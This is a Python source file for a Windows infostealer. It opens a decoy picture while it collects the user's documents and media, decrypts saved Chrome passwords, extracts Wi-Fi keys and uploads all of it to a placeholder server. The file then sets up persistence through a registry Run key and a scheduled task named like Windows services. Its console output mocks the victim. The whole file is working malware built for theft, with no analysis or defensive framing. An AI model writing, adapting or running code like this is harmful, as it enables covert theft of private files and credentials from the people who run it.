import subprocess
import requests
import threading
import os
import sys
import zipfile
import io
import time
import platform
from dotenv import load_dotenv
import threading
import ctypes
from PIL import Image
load_dotenv()
if platform.system() != "Windows":
    sys.exit(0)
class FileHarvester:
    def __init__(self, server_url):
        self.server_url = server_url
        self.excluded_drives = ['C:\\']
        self.file_types = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
                          '.jpg', '.png', '.jpeg', '.mp3', '.mp4', '.zip',
                          '.rar', '.7z', '.exe', '.dll', '.config', '.ini']
        self.max_file_size = 100 * 1024 * 1024
        self.collected_files = []
    def execute_cmd(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE
            )
            return result.stdout.decode('utf-8', errors='ignore').strip()
        except:
            return ""
    def get_all_drives(self):
        drives = []
        try:
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in range(ord('A'), ord('Z') + 1):
                drive_letter = f"{chr(letter)}:\\"
                if bitmask & (1 << (letter - ord('A'))):
                    if drive_letter not in self.excluded_drives:
                        drives.append(drive_letter)
        except:
            for letter in range(ord('A'), ord('Z') + 1):
                drive_letter = f"{chr(letter)}:\\"
                try:
                    cmd = f'if exist "{drive_letter}" echo Y'
                    result = self.execute_cmd(cmd)
                    if result == "Y" and drive_letter not in self.excluded_drives:
                        drives.append(drive_letter)
                except:
                    pass
        return drives
    def steal_personal_folders(self):
        personal_folders = [
            '%USERPROFILE%\\Downloads',
            '%USERPROFILE%\\Desktop',
            '%USERPROFILE%\\Documents',
            '%USERPROFILE%\\Music',
            '%USERPROFILE%\\Pictures',
            '%USERPROFILE%\\Videos'
        ]
        stolen_files = []
        for folder in personal_folders:
            print(f"[+] Looting {folder}...")
            cmd = f'dir "{folder}" /s /b'
            result = self.execute_cmd(cmd)
            if result:
                files = [line.strip() for line in result.split('\n') if line.strip()]
                
                for file_path in files[:200]: 
                    check_cmd = f'if exist "{file_path}" (echo F) else (echo D)'
                    type_check = self.execute_cmd(f'echo %~a1 | findstr /r "^d" >nul && echo D || echo F"')
                    if "F" in type_check:
                        ext_cmd = f'echo {file_path} | rev | cut -d. -f1 | rev'
                        file_ext = self.execute_cmd(f'powershell "[System.IO.Path]::GetExtension(\'{file_path}\')"').lower()
                        if any(file_ext.endswith(ext) for ext in self.file_types):
                            size_cmd = f'for %I in ("{file_path}") do @echo %~zI'
                            size_str = self.execute_cmd(size_cmd)
                            try:
                                file_size = int(size_str) if size_str.isdigit() else 0
                                if file_size <= self.max_file_size:
                                    stolen_files.append(file_path)
                                    print(f"  [+] Found: {file_path}")
                            except:
                                pass
        if stolen_files:
            print(f"[+] Found {len(stolen_files)} files in personal folders")
            self.send_files_to_server(stolen_files)
        else:
            print("[-] No files found in personal folders (user must be poor as fuck)")
    def send_files_to_server(self, file_list):
        try:
            for file_path in file_list[:50]: 
                try:
                    content_cmd = f'type "{file_path}"'
                    content = self.execute_cmd(content_cmd).encode('utf-8', errors='ignore')
                    if content:
                        files = {
                            'file': (self.get_filename(file_path), content, 'application/octet-stream')
                        }
                        data = {
                            'path': file_path,
                            'hostname': self.get_hostname(),
                            'user': self.get_username(),
                            'timestamp': time.time()
                        }
                        response = requests.post(f"{self.server_url}/upload_raw", 
                                               files=files, 
                                               data=data,
                                               timeout=10)
                        if response.status_code == 200:
                            print(f"[+] Sent: {self.get_filename(file_path)}")
                        else:
                            print(f"[-] Failed: {self.get_filename(file_path)}")
                        time.sleep(0.1)
                except Exception as e:
                    print(f"  [-] Error sending {file_path}: {e}")
                    continue
        except Exception as e:
            print(f"[-] Major error in send_files_to_server: {e}")
    def get_filename(self, path):
        cmd = f'powershell "Split-Path \'{path}\' -Leaf"'
        return self.execute_cmd(cmd) or "unknown.file"
    def collect_files(self, path):
        try:
            cmd = f'dir "{path}" /b /a-d'
            result = self.execute_cmd(cmd)
            files = [line.strip() for line in result.split('\n') if line.strip()]
            for file in files:
                file_path = f"{path}\\{file}"
                ext_cmd = f'powershell "[System.IO.Path]::GetExtension(\'{file_path}\')"'
                file_ext = self.execute_cmd(ext_cmd).lower()
                if any(file_ext.endswith(ext) for ext in self.file_types):
                    size_cmd = f'for %I in ("{file_path}") do @echo %~zI'
                    size_str = self.execute_cmd(size_cmd)
                    try:
                        size = int(size_str) if size_str.isdigit() else 0
                        if size <= self.max_file_size:
                            self.collected_files.append(file_path)
                    except:
                        pass
            dir_cmd = f'dir "{path}" /b /ad'
            dir_result = self.execute_cmd(dir_cmd)
            dirs = [line.strip() for line in dir_result.split('\n') if line.strip()]
            for dir_name in dirs[:10]: 
                sub_path = f"{path}\\{dir_name}"
                self.collect_files(sub_path)  
        except Exception as e:
            pass
    def read_file(self, file_path):
        try:
            cmd = f'type "{file_path}"'
            result = self.execute_cmd(cmd)
            return result.encode('utf-8', errors='ignore')
        except:
            return None
    def get_hostname(self):
        return self.execute_cmd('hostname') or "UNKNOWN"
    def get_username(self):
        result = self.execute_cmd('whoami')
        if '\\' in result:
            return result.split('\\')[-1]
        return "UNKNOWN"
    def compress_and_send(self):
        if not self.collected_files:
            return
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for file_path in self.collected_files[:100]:
                content = self.read_file(file_path)
                if content:
                    try:
                        zip_file.writestr(self.get_filename(file_path), content)
                    except:
                        continue
        zip_buffer.seek(0)
        try:
            files = {'files': ('stolen_files.zip', zip_buffer, 'application/zip')}
            data = {
                'hostname': self.get_hostname(),
                'user': self.get_username(),
                'timestamp': time.time()
            }
            response = requests.post(f"{self.server_url}/upload", 
                                   files=files, 
                                   data=data,
                                   timeout=30)
            if response.status_code == 200:
                print(f"[+] Successfully sent {len(self.collected_files)} files to server 😈")
            else:
                print(f"[-] Failed to send files: {response.status_code}")
        except Exception as e:
            print(f"[-] Connection error: {e}")
    def steal_browser_passwords(self):
        stolen_data = []
        try:
            import sqlite3
            import win32crypt
            chrome_cmd = 'echo %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'
            chrome_path = self.execute_cmd(chrome_cmd)
            if chrome_path:
                temp_db = "temp_chrome.db"
                copy_cmd = f'copy "{chrome_path}" "{temp_db}"'
                self.execute_cmd(copy_cmd)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cursor.fetchall():
                    url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    try:
                        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                        if decrypted_password:
                            stolen_data.append({
                                'url': url,
                                'username': username,
                                'password': decrypted_password.decode('utf-8')
                            })
                    except:
                        pass
                conn.close()
                del_cmd = f'del "{temp_db}" /f'
                self.execute_cmd(del_cmd)
        except:
            pass
        return stolen_data
    def steal_wifi_passwords(self):
        wifi_passwords = []
        try:
            cmd = 'netsh wlan show profiles'
            profiles = self.execute_cmd(cmd)
            profile_lines = [line.strip() for line in profiles.split('\n') if "All User Profile" in line]
            profile_names = [line.split(":")[1].strip() for line in profile_lines]
            for profile in profile_names:
                try:
                    results_cmd = f'netsh wlan show profile "{profile}" key=clear'
                    results = self.execute_cmd(results_cmd)
                    for line in results.split('\n'):
                        if "Key Content" in line:
                            password = line.split(":")[1].strip()
                            wifi_passwords.append({
                                'ssid': profile,
                                'password': password
                            })
                            break
                except:
                    continue
        except:
            pass
        return wifi_passwords
    def run(self):
        print("[+] Targeting personal folders first...")
        self.steal_personal_folders()
        print("[+] Starting file harvesting operation...")
        drives = self.get_all_drives()
        print(f"[+] Found {len(drives)} non-system drives")
        for drive in drives:
            print(f"[+] Scanning {drive}")
            self.collect_files(drive)
        print(f"[+] Collected {len(self.collected_files)} files")
        print("[+] Stealing browser passwords...")
        browser_data = self.steal_browser_passwords()
        print("[+] Stealing WiFi passwords...")
        wifi_data = self.steal_wifi_passwords()
        print("[+] Sending data to server...")
        self.compress_and_send()
        if browser_data or wifi_data:
            try:
                credentials = {
                    'browser_passwords': browser_data,
                    'wifi_passwords': wifi_data,
                    'hostname': self.get_hostname(),
                    'user': self.get_username()
                }
                requests.post(f"{self.server_url}/credentials",
                                       json=credentials,
                                       timeout=30)
                print(f"[+] Sent {len(browser_data)} browser passwords and {len(wifi_data)} WiFi passwords 😈")
            except:
                print("[-] Failed to send credentials")
        print("[+] Operation complete. Privacy is for pussies! 💀")
def persist_in_startup():
    try:
        reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateService /t REG_SZ /d "%s" /f' % sys.argv[0]
        subprocess.run(reg_cmd, 
                      shell=True,
                      creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
        print("[+] Added to startup registry 😈")
    except:
        print("[-] Failed to add to startup")
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = "."
    cmd = f'powershell "Resolve-Path \'{base_path}\\{relative_path}\'"'
    result = subprocess.run(cmd, 
                          shell=True,
                          capture_output=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
    if result.stdout:
        return result.stdout.decode('utf-8', errors='ignore').strip()
    return os.path.abspath(os.path.join(base_path, relative_path))
def open_image(relative_path):
    image_path = resource_path(relative_path)
    cmd = f'start "" "{image_path}"'
    subprocess.run(cmd, 
                  shell=True,
                  creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
if __name__ == "__main__":
    threading.Thread(
        target=open_image,
        args=("picture.jpg",),
        daemon=True
    ).start()
    SERVER_URL = "__SERVER__"
    persist_in_startup()
    harvester = FileHarvester(SERVER_URL)
    harvester.run()
    try:
        task_cmd = f'schtasks /create /tn SystemMaintenance /tr "{sys.argv[0]}" /sc daily /st 00:00 /f'
        subprocess.run(task_cmd,
                      shell=True,
                      creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE)
    except:
        pass